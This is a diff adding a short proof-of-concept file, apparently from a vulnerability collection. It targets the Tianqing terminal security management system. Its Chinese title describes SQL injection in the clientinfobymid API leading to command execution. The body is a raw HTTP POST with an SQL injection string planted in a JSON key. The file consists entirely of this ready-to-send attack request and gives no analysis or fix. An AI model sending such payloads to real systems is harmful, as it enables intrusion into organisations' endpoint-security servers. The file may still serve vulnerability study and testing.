@@ -1,0 +1,8 @@
+#天擎终端安全管理系统clientinfobymid方法SQL注入导致命令执行漏洞
+POST /api/terminal/clientinfobymid HTTP/1.1
+Host: www.swaf.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+
+{"mids":{"1 ,:mid_1);select 'aaa' -- aa":"","1":1}}
